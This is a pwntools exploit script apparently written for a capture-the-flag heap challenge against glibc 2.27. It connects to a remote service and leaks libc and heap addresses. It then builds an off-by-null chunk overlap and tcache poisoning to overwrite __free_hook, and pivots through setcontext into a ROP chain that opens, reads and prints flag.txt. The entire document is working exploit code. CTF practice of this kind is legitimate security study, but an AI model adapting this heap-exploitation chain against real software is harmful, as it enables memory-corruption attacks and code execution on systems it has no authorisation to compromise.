from pwn import *

exe = ELF("./chall", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
context.binary = exe
context.log_level = 'info'

io = remote("152.118.201.210", 2604)

def add(idx, size):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())

def show(idx):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.recvuntil(b"Content: ")
    return io.recvuntil(b"\nMenu:", drop=True)

def delete(idx):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx, content):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"content: ", content)

# Leak Libc (Reuse your working logic)
add(0, 0x500)
add(1, 0x500)
delete(0)
add(0, 0x500)
leak_data = show(0).strip()
libc.address = u64(leak_data.ljust(8, b'\x00')) - 0x3ebca0
log.info(f"Libc base: {hex(libc.address)}")

# Overlap Chunk buat Tcache Poisoning
add(2, 0x4f0)
add(3, 0x410)
add(4, 0x4f0)
add(5, 0x410) # Guard
delete(2)
edit(3, b'A'*0x410 + p64(0x910)) # Off-by-null
delete(4)
add(2, 0x910) # Overlap chunks[3]

delete(3)
heap_leak = u64(show(2)[0x500:0x508].ljust(8, b'\x00'))
heap_base = heap_leak - 0x1410 # Offset tcache
log.info(f"Heap base: {hex(heap_base)}")

# Gadgets
pop_rdi = libc.address + 0x2164f
pop_rsi = libc.address + 0x23a6a
pop_rdx = libc.address + 0x1b96
pop_rax = libc.address + 0x1b500
syscall = libc.address + 0xd2975
ret = libc.address + 0x8aa # for alignment

flag_str = heap_base + 0x2000
rop_addr = heap_base + 0x2050

# ROP Chain ORW
rop = [
    pop_rdi, flag_str,
    pop_rsi, 0,
    pop_rax, 2, # open
    syscall,

    pop_rdi, 3, 
    pop_rsi, flag_str + 0x100,
    pop_rdx, 0x100,
    pop_rax, 0, # read
    syscall,

    pop_rdi, 1, # stdout
    pop_rsi, flag_str + 0x100,
    pop_rdx, 0x100,
    pop_rax, 1, # write
    syscall,
    
    libc.sym['exit'], 0
]

add(6, 0x410) # ambil balik chunk 3 dari tcache
edit(2, b'A'*0x500 + b"flag.txt\x00".ljust(0x50, b'\x00') + flat(rop))

# trigger setcontext+61
delete(6)
edit(2, b'A'*0x4f0 + p64(0) + p64(0x421) + p64(libc.sym['__free_hook']))
add(3, 0x410)
add(6, 0x410) 

payload_setcontext = b'A'*0xa0 + p64(rop_addr) + p64(ret)
add(8, 0x410)
edit(8, payload_setcontext)

edit(6, p64(libc.address + 0x52160 + 61))

log.info("Executing ORW Chain...")
delete(8) # Trigger free(8) -> setcontext(8) -> ROP

io.interactive()